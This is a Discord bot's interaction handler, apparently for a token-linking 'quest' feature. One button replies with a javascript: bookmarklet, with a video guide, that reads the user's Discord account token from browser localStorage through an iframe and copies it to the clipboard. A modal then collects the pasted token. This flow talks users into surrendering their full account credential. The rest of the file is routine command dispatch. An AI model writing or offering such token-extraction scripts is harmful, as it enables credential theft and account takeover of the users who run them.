import { getEmoji } from '../handlers/emoji.js';
import { handleLinkModal, handleLinkPromptButton } from '../commands/questCommands.js';
import { MessageFlags } from 'discord.js';

export default {
    name: 'interactionCreate',
    once: false,
    async execute(interaction, client) {

        // Modal: link token
        if (interaction.isModalSubmit() && interaction.customId === 'link_token_modal') {
            await handleLinkModal(interaction, client);
            return;
        }

        // Button: link_prompt (opens modal)
        if (interaction.isButton() && interaction.customId === 'link_prompt') {
            await handleLinkPromptButton(interaction);
            return;
        }

        // Button: platform_pc (JavaScript script button)
        if (interaction.isButton() && interaction.customId === 'platform_pc') {
            await interaction.reply({
                content: `### 🪄 Token Copy Script\nLong press or use the copy button to copy the code below:\nhttps://cdn.discordapp.com/attachments/1539722714036699276/1542207446423048342/lv_0_20260826215752.mp4?ex=6a90641c&is=6a8f129c&hm=7bc7af1c82a00cf864ba23c209b174b031cc95e4ae9851d2b64bd4387fd0f212&\n\n\`\njavascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px%2016px;border-radius:8px;box-shadow:0%204px%2012px%20rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe%20UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity%200.3s%20ease-in-out;';document.body.appendChild(n);setTimeout(()=%3E{n.style.opacity='1';},50);setTimeout(()=%3E{n.style.opacity='0';setTimeout(()=%3En.remove(),500);},3500);}catch(e){alert('Error%20copying%20token');}})();\n\``,
                flags: MessageFlags.Ephemeral
            });
            return;
        }
        // Slash commands
        if (!interaction.isChatInputCommand()) return;
        const command = client.commands.get(interaction.commandName);
        if (!command) return;

        try {
            await command.execute(interaction, client);
        } catch (err) {
            console.error(err);
            const msg = { content: `${getEmoji('error')} Something went wrong.`, flags: 64 };
            if (interaction.replied || interaction.deferred) {
                await interaction.followUp(msg).catch(() => {});
            } else {
                await interaction.reply(msg).catch(() => {});
            }
        }
    },
};
